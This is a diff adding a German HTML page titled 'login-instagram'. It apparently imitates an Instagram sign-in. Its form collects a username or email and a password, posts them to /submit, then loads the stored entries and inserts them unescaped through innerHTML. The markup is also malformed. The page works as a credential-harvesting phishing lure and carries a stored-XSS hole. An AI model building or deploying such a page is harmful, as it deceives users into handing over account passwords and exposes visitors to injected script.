@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login-instagram 💬</title>
+    <style>
+        body {
+            font-family: "Segoe UI", sans-serif;
+            background: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 700px;
+            margin: 50px auto;
+            background: white;
+            padding: 2rem;
+            border-radius: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+
+        form {
+            margin-bottom: 2rem;
+        }
+
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        button {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 1rem;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .message {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+
+        .message strong {
+            color: #007bff;
+        }
+
+        .note {
+            text-align: center;
+            color: #777;
+            font-size: 0.9rem;
+        }S
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Anmelden</h1>
+        <body>
+
+   <img src="{{ url_for('static', filename='logo.png') }}" 
+     alt="logo"
+     style="width:100px; border-radius:10px;">
+
+
+<body>
+
+        <form id="messageForm" method="POST" action="/submit">
+            <input type="hidden" name="consent_token" id="consent_token">
+            
+            <label for="name">Benutzername/Email</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="message">Passwort</label>
+            <textarea id="message" name="message" rows="4" required></textarea>
+
+            <button type="submit">Anmelden</button>
+        </form>
+
+        <div id="messages"></div>
+
+        <p class=<p class="note">Passwort vergessen?</p>
+    </div>
+
+    <script>
+        // Prüfen, ob Zustimmung existiert
+        const token = localStorage.getItem("consent_token");
+        if (!token) {
+            window.location.href = "/privacy";
+        } else {
+            document.getElementById("consent_token").value = token;
+        }
+
+        // Nachricht absenden (ohne Neuladen)
+        const form = document.getElementById("messageForm");
+        form.addEventListener("submit", async (e) => {
+            e.preventDefault();
+
+            const formData = new FormData(form);
+            const response = await fetch("/submit", { method: "POST", body: formData });
+
+            if (response.ok) {
+                alert("Nachricht gespeichert!");
+                form.reset();
+                loadMessages();
+            } else {
+                alert(await response.text());
+            }
+        });
+
+        // Nachrichten laden
+        async function loadMessages() {
+            const res = await fetch("/get_messages");
+            if (res.ok) {
+                const data = await res.json();
+                const container = document.getElementById("messages");
+                container.innerHTML = "";
+
+                data.forEach(msg => {
+                    const div = document.createElement("div");
+                    div.className = "message";
+                    div.innerHTML = `<strong>${msg.name}:</strong> ${msg.message}`;
+                    container.appendChild(div);
+                });
+            }
+        }
+                
+
+        // Nachrichten beim Laden anzeigen
+        loadMessages();
+    </script>
+</body>
+</html>
